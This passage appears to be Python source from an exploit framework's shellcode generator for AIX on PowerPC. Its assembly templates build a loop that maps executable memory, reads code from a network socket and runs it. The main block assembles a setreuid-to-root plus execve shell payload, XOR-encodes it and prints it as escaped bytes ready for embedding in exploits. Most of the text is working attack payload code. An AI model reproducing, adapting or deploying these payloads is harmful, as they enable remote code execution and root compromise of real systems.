            ! r31 = codebuf // mmap
            ! r29 = bufsize
            ! r21 = pcloc
            ! r28 = codeptr
            ! r20 = tmp
            ! r18 = main_loop
            
            ! before all asm code (MOSDEF entry point)
            read_and_exec_loop:
            
            ! get our current location in memory
                xor. r6, r6, r6
                bnel read_and_exec_loop
                ! <-- that addr is now in $lr
            pcloc:
                mflr r21
            
        """
         
        # if fd is already in $r30 we wont set it again just because it's nicer
        # but we also save 4 bytes!!!
        if str(args["fd"]) != "r30":
            code += """
            ! set provided sockfd
                FD_SET_INSTR r30, FD   ! fd
        """
        code += """
            
            ! get errno
                lwz r25, 20(r1)
                lwz r25, 64(r25)       ! r25 = &errno
            
            ! mmap(0, 0x10000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON, -1, 0);
                li r3, 0
                lis r4, 1
                li r5, mmap_protections
                li r6, MAP_ANON
                li r7, -1
                mr r8, r3
                addi r20, r21, mmap_out - pcloc
                mtlr r20
                li r2, SYS_mmap
                crorc 6, 6, 6
                sc
            mmap_out:
            
                cmpwi r3, MAP_FAILED
                beq- failed
                mr r31, r3             ! r31 = codebuf
            
            ! save <here> in r18 to come back directly here after exec the mmap buffer
                addi r18, r21, main_loop - pcloc
            
            main_loop:
            
            ! set the first instruction of the mmap buffer: restore lr from r18
                set r28, restore_lr_after_jmp - pcloc
                lwzx r28, r21, r28
                stw r28, 0(r31)
            
            ! read(FD, &nbytes, sizeof(nbytes));
            read_size:
                mr r3, r30             ! r30 = sockfd
                addi r4, r31, 4        ! &mmap[4]
                li r5, 4
                addi r20, r21, readsize_out - pcloc
                mtlr r20
                li r2, SYS_kread
                crorc 6, 6, 6
                sc
            readsize_out:
            
                cmplwi r3, 4 ! if (r != sizeof(nbytes))
                beq+ readsize_is_4_valid
                cmpwi r3, -1
                bne- failed
                lwz r4,0(r25)          ! errno
                cmpwi r4, EINTR        ! errno == EINTR?
                beq- read_size
                b failed
            readsize_is_4_valid:
                lwz r29, 4(r31)        ! r29 = *mmap[4] = codesize
                
            ! prepare r28 before read loop
                addi r28, r31, 4       ! r28 = mmap_ptr = &mmap[4]
                
            ! read(FD, codeptr, nbytes);
            read_buf:
                cmpwi r29, 0 ! while (nbytes) ! do we still need to read some bytes?
                beq- exec_code         ! if no, we can exec the recently read code
                mr r3, r30             ! arg0 = r30 = sockfd
                mr r4, r28             ! arg1 = mmap_ptr
                mr r5, r29             ! arg2 = codesize
                addi r20, r21, read_out - pcloc
                mtlr r20
                li r2, SYS_kread
                crorc 6, 6, 6
                sc
            read_out:
            
                cmpwi r3, 0
                bgt+ read_out_ok       ! we read smth
                beq- failed            ! read() returned 0: connection closed
            ! here read() returned -1, we have to check errno
                lwz r4, 0(r25)        ! errno
                cmpwi r4, EINTR
                beq- read_buf          ! if errno == EINTR: retry to read
                b failed               ! else we are mucked up
            read_out_ok:
                add r28, r28, r3       ! mmap_ptr += read_size
                subfc r29, r3, r29     ! codesize -= read_size
                bne- read_buf          ! if codesize != 0: continue to read on sockfd
            
            exec_code:
                mtlr r31
                li r2, SYS_sync
                crorc 6, 6, 6
                sc
            
            ! _exit(random)
            failed:
                li r2, SYS__exit
                crorc 6, 6, 6
                sc
            
            ! never reached
            
            ! following is used to patch sent code
            restore_lr_after_jmp:
                mtlr r18
        """

        syscalls = ["SYS_mmap", "SYS_kread", "SYS__exit", "SYS_sync"]
        constants = ["EINTR", "MAP_ANON", "MAP_FAILED"]
        code = self.libc.patch_defines_with_values(code, syscalls + constants)
        code = code.replace('mmap_protections', "%s" % mmap_protections)
        code = code.replace("FD_SET_INSTR", fd_set_instr)
        code = code.replace("FD", str(args["fd"]))
        self.code+=code
    
    def munmap_caller(self, args): # TODO: supply size in argument
        # this code must be at the begining of a codebuffer send to read_exec...
        # it will munmap the page of the caller
        # munmap(lr & ~0xffff, 0x10000)
        
        code="""
                mflr r3
            munmap_caller:
                xor. r6, r6, r6
                bnel- munmap_caller
                ! <-- that addr is now in $lr
            munmap_pc:
                mflr r0
                addi r0, r0, munmap_out - munmap_pc
                mtlr r0
                lis r2, -1             ! ~(0x10000 - 1)
                and r3, r3, r2         ! r3 = ctr & ~(0x10000 - 1)
                lis r4, 1
                li r2, SYS_munmap
                crorc 6, 6, 6
                sc
            munmap_out:
            ! code continue here
        """
        code = self.libc.patch_defines_with_values(code, ["SYS_munmap"])
        self.code += code
    
    def sendreg(self,args):
        # send a 32-Bit register
        fdreg = args["fdreg"]
        #print "fdreg=%s"%fdreg
        code="""
                stwu r1, -144(r1)
                stmw r2, 4(r1)
                stw REGTOSEND, 140(r1)
            sendreg:
                xor. r6, r6, r6
                bnel sendreg
            sendreg_here_in_lr:
                mflr r20
                mr r3, FDREG           ! arg0
                addi r4, r1,140        ! arg1 = buf
                li r5, 4               ! arg2 = sizeof(int32) = 4
                addi r21, r20, sendreg_out - sendreg_here_in_lr
                mtlr r21
                li r2, SYS_write
                crorc 6, 6, 6
                sc
            sendreg_out:
                lmw r2, 4(r1)
                lwz r1, 0(r1)
        """
        code=code.replace("FDREG",args["fdreg"])
        code=code.replace("REGTOSEND",args["regtosend"])
        code = self.libc.patch_defines_with_values(code, ["SYS_write"])
        self.code+=code
   
    # This is the proper way to flush the caches on AIX .. you call
    # SYS_sync and set the link register to the code you want to
    # return to .. we also have to do this for our mosdef callbacks
    # and anything else that reads in code ..
    #
    # e.g. in pseudo-code
    #
    # code = read(1024)
    # flushcache(code)
    # {
    #     mtrl %0 : : "r" (code)
    #     SYS_sync() -> returns to code via link register
    # }
    #

    def flushcache(self,args):
        # flush the cache where $pc is, and continue code execution
        code="""
            flushcache:
                xor. r6, r6, r6
                bnel flushcache
            flushcache_here_in_lr:
                mflr r20
                addi r20, r20, flushcache_out - flushcache_here_in_lr
                mtlr r20
                li r2, SYS_sync
                crorc 6, 6, 6
                sc
            flushcache_out:
            ! continue code execution
        """
        code = self.libc.patch_defines_with_values(code, ["SYS_sync"])
        self.code+=code
    
    def test(self):
        self.addAttr("read_and_exec_loop", {'fd': -1})
        self.addAttr("exit", None)

if __name__=="__main__":
    sc = aix_powerpc(version = '5.2')
    sc.addAttr('setreuid', { 'ruid' : 0, 'euid' : 0 })
    sc.addAttr('execve', None)
    data    = sc.get()
    encoded = sc.xor_encode(data, xormask=0xae)
    print("Payload: %d bytes" % len(encoded))
    n = 0    
    for c in encoded:
        if n == 0:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        n += 1
        if n == 4:
            n = 0
            sys.stdout.write("\"\n")
